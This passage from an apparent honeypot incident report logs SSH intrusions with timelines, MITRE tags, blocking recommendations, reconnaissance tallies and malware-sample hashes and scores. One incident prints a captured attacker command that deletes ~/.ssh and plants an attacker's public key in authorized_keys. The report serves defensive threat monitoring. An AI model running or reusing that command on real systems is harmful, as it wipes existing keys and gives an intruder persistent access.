| `2026-07-11 18:21:12` | `cowrie.command.input` |
| `2026-07-11 18:21:12` | `cowrie.log.closed` |
| `2026-07-11 18:21:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6b4c2d04a9b

| Field | Detail |
|---|---|
| **Source IP** | `178.105.180[.]108` |
| **First Seen** | 2026-07-11 18:23 |
| **Last Seen** | 2026-07-11 18:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:23:38` | `cowrie.session.connect` |
| `2026-07-11 18:23:38` | `cowrie.client.version` |
| `2026-07-11 18:23:38` | `cowrie.client.kex` |
| `2026-07-11 18:23:38` | `cowrie.login.success` |
| `2026-07-11 18:23:39` | `cowrie.session.params` |
| `2026-07-11 18:23:39` | `cowrie.command.input` |
| `2026-07-11 18:23:39` | `cowrie.command.failed` |
| `2026-07-11 18:23:39` | `cowrie.log.closed` |
| `2026-07-11 18:23:40` | `cowrie.session.params` |
| `2026-07-11 18:23:40` | `cowrie.command.input` |
| `2026-07-11 18:23:40` | `cowrie.session.file_download` |
| `2026-07-11 18:23:40` | `cowrie.log.closed` |
| `2026-07-11 18:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.105.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `178.105.180[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21140133df75

| Field | Detail |
|---|---|
| **Source IP** | `178.105.180[.]108` |
| **First Seen** | 2026-07-11 18:23 |
| **Last Seen** | 2026-07-11 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:23:40` | `cowrie.session.connect` |
| `2026-07-11 18:23:40` | `cowrie.client.version` |
| `2026-07-11 18:23:40` | `cowrie.client.kex` |
| `2026-07-11 18:23:41` | `cowrie.login.success` |
| `2026-07-11 18:23:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.105.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `178.105.180[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f82893e61b5

| Field | Detail |
|---|---|
| **Source IP** | `178.105.180[.]108` |
| **First Seen** | 2026-07-11 18:23 |
| **Last Seen** | 2026-07-11 18:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:23:41` | `cowrie.session.connect` |
| `2026-07-11 18:23:41` | `cowrie.client.version` |
| `2026-07-11 18:23:41` | `cowrie.client.kex` |
| `2026-07-11 18:23:41` | `cowrie.login.success` |
| `2026-07-11 18:23:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.105.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `178.105.180[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3917df77494f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 18:23 |
| **Last Seen** | 2026-07-11 18:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:23:53` | `cowrie.session.connect` |
| `2026-07-11 18:23:53` | `cowrie.client.version` |
| `2026-07-11 18:23:53` | `cowrie.client.kex` |
| `2026-07-11 18:23:54` | `cowrie.login.success` |
| `2026-07-11 18:23:55` | `cowrie.session.params` |
| `2026-07-11 18:23:55` | `cowrie.command.input` |
| `2026-07-11 18:23:55` | `cowrie.log.closed` |
| `2026-07-11 18:23:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5de112a4d06

| Field | Detail |
|---|---|
| **Source IP** | `49.124.147[.]109` |
| **First Seen** | 2026-07-11 18:33 |
| **Last Seen** | 2026-07-11 18:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:33:27` | `cowrie.session.connect` |
| `2026-07-11 18:33:27` | `cowrie.client.version` |
| `2026-07-11 18:33:27` | `cowrie.client.kex` |
| `2026-07-11 18:33:29` | `cowrie.login.success` |
| `2026-07-11 18:33:30` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:33:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.147[.]109` to AbuseIPDB if not already reported
- [ ] Block `49.124.147[.]109` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8457ac463c8a

| Field | Detail |
|---|---|
| **Source IP** | `60.174.35[.]18` |
| **First Seen** | 2026-07-11 18:33 |
| **Last Seen** | 2026-07-11 18:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:33:35` | `cowrie.session.connect` |
| `2026-07-11 18:33:36` | `cowrie.client.version` |
| `2026-07-11 18:33:36` | `cowrie.client.kex` |
| `2026-07-11 18:33:39` | `cowrie.login.success` |
| `2026-07-11 18:33:39` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:33:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.174.35[.]18` to AbuseIPDB if not already reported
- [ ] Block `60.174.35[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-647924e5f4af

| Field | Detail |
|---|---|
| **Source IP** | `117.248.201[.]39` |
| **First Seen** | 2026-07-11 18:35 |
| **Last Seen** | 2026-07-11 18:35 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:35:51` | `cowrie.session.connect` |
| `2026-07-11 18:35:51` | `cowrie.client.version` |
| `2026-07-11 18:35:51` | `cowrie.client.kex` |
| `2026-07-11 18:35:53` | `cowrie.login.success` |
| `2026-07-11 18:35:53` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:35:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.248.201[.]39` to AbuseIPDB if not already reported
- [ ] Block `117.248.201[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58b2ec10dd45

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 18:39 |
| **Last Seen** | 2026-07-11 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:39:09` | `cowrie.session.connect` |
| `2026-07-11 18:39:09` | `cowrie.client.version` |
| `2026-07-11 18:39:09` | `cowrie.client.kex` |
| `2026-07-11 18:39:10` | `cowrie.login.success` |
| `2026-07-11 18:39:11` | `cowrie.session.params` |
| `2026-07-11 18:39:11` | `cowrie.command.input` |
| `2026-07-11 18:39:11` | `cowrie.log.closed` |
| `2026-07-11 18:39:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bd45ca8da25

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 18:40 |
| **Last Seen** | 2026-07-11 18:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:40:05` | `cowrie.session.connect` |
| `2026-07-11 18:40:05` | `cowrie.client.version` |
| `2026-07-11 18:40:06` | `cowrie.client.kex` |
| `2026-07-11 18:40:08` | `cowrie.login.success` |
| `2026-07-11 18:40:09` | `cowrie.session.params` |
| `2026-07-11 18:40:09` | `cowrie.command.input` |
| `2026-07-11 18:40:09` | `cowrie.log.closed` |
| `2026-07-11 18:40:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7a7d2f474d3

| Field | Detail |
|---|---|
| **Source IP** | `47.252.16[.]44` |
| **First Seen** | 2026-07-11 18:42 |
| **Last Seen** | 2026-07-11 18:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:42:14` | `cowrie.session.connect` |
| `2026-07-11 18:42:14` | `cowrie.client.version` |
| `2026-07-11 18:42:14` | `cowrie.client.kex` |
| `2026-07-11 18:42:14` | `cowrie.login.success` |
| `2026-07-11 18:42:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.252.16[.]44` to AbuseIPDB if not already reported
- [ ] Block `47.252.16[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30755780c10c

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-11 18:42 |
| **Last Seen** | 2026-07-11 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:42:14` | `cowrie.session.connect` |
| `2026-07-11 18:42:14` | `cowrie.client.version` |
| `2026-07-11 18:42:14` | `cowrie.client.kex` |
| `2026-07-11 18:42:15` | `cowrie.login.success` |
| `2026-07-11 18:42:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130e24718dcf

| Field | Detail |
|---|---|
| **Source IP** | `183.89.208[.]174` |
| **First Seen** | 2026-07-11 18:42 |
| **Last Seen** | 2026-07-11 18:42 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:42:42` | `cowrie.session.connect` |
| `2026-07-11 18:42:43` | `cowrie.client.version` |
| `2026-07-11 18:42:43` | `cowrie.client.kex` |
| `2026-07-11 18:42:45` | `cowrie.login.success` |
| `2026-07-11 18:42:46` | `cowrie.direct-tcpip.request` |
| `2026-07-11 18:42:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.89.208[.]174` to AbuseIPDB if not already reported
- [ ] Block `183.89.208[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dbc30263cf8

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-11 18:53 |
| **Last Seen** | 2026-07-11 18:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:53:38` | `cowrie.session.connect` |
| `2026-07-11 18:53:38` | `cowrie.client.version` |
| `2026-07-11 18:53:38` | `cowrie.client.kex` |
| `2026-07-11 18:53:39` | `cowrie.login.success` |
| `2026-07-11 18:53:40` | `cowrie.session.params` |
| `2026-07-11 18:53:40` | `cowrie.command.input` |
| `2026-07-11 18:53:40` | `cowrie.log.closed` |
| `2026-07-11 18:53:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dee8b7f3caa3

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-11 18:53 |
| **Last Seen** | 2026-07-11 18:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-11 18:53:59` | `cowrie.session.connect` |
| `2026-07-11 18:54:00` | `cowrie.client.version` |
| `2026-07-11 18:54:00` | `cowrie.client.kex` |
| `2026-07-11 18:54:03` | `cowrie.login.success` |
| `2026-07-11 18:54:05` | `cowrie.session.params` |
| `2026-07-11 18:54:05` | `cowrie.command.input` |
| `2026-07-11 18:54:05` | `cowrie.log.closed` |
| `2026-07-11 18:54:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **24** | 2026-07-11 17:00 | 2026-07-11 18:54 | 29m | 0 | `T1592` | 🟠 MEDIUM |
| `104.143.10[.]174` | **9** | 2026-07-11 17:45 | 2026-07-11 18:54 | 3m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **8** | 2026-07-11 16:57 | 2026-07-11 18:51 | 5m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **4** | 2026-07-11 17:20 | 2026-07-11 18:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `39.105.212[.]205` | **4** | 2026-07-11 17:10 | 2026-07-11 17:14 | 8m | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]236` | **4** | 2026-07-11 17:53 | 2026-07-11 17:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]135` | **3** | 2026-07-11 17:52 | 2026-07-11 17:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]222` | **3** | 2026-07-11 17:53 | 2026-07-11 17:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]109` | **3** | 2026-07-11 17:53 | 2026-07-11 17:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]78` | **2** | 2026-07-11 17:27 | 2026-07-11 17:28 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.96.192[.]88` | 1 | 2026-07-11 17:58 | 2026-07-11 18:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.25.140[.]211` | 1 | 2026-07-11 18:36 | 2026-07-11 18:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.26[.]113` | 1 | 2026-07-11 17:15 | 2026-07-11 17:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `121.147.220[.]27` | 1 | 2026-07-11 17:36 | 2026-07-11 17:36 | 13s | 0 | `T1592` | 🟢 LOW |
| `159.65.233[.]253` | 1 | 2026-07-11 18:06 | 2026-07-11 18:07 | 73s | 0 | `T1592` | 🟢 LOW |
| `183.171.61[.]218` | 1 | 2026-07-11 17:38 | 2026-07-11 17:38 | 4s | 0 | `T1592` | 🟢 LOW |
| `183.222.14[.]9` | 1 | 2026-07-11 18:40 | 2026-07-11 18:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-11 16:55 | 2026-07-11 16:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.200.9[.]182` | 1 | 2026-07-11 17:42 | 2026-07-11 17:42 | 16s | 0 | `T1592` | 🟢 LOW |
| `65.20.251[.]41` | 1 | 2026-07-11 16:59 | 2026-07-11 16:59 | 6s | 0 | `T1592` | 🟢 LOW |
| `78.66.45[.]101` | 1 | 2026-07-11 18:42 | 2026-07-11 18:44 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **25/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `77ed8c7518a32663fb766f729075dcdddc355c8d6ebe381092df51bb891e0cfc` | ELF Binary (Linux executable) (x86 32-bit) | `77ed8c7518a32663...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 57/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `7a4a3a129b726b531941b41d734521e8905d57a57a7e8a0a7e5dff41ed22f6ba` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `7a4a3a129b726b53...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
